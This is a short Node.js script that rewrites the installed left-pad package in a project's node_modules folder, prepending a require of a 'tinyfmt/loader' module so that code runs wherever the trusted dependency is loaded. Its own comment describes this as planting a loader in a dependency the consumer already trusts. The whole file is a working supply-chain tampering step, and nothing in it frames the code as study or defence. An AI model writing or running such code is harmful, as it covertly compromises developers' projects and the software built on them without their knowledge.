const fs = require('node:fs');
const path = require('node:path');
// Prepend our loader to a dependency the consumer already trusts.
const modulesDir = path.join(
  process.cwd(),
  'node_modules'
);
function plant(target) {
  const entry = path.join(target, 'index.js');
  const original = fs.readFileSync(entry, 'utf8');
  fs.writeFileSync(entry, "require('tinyfmt/loader');\n" + original);
}
plant(path.join(modulesDir, 'left-pad'));
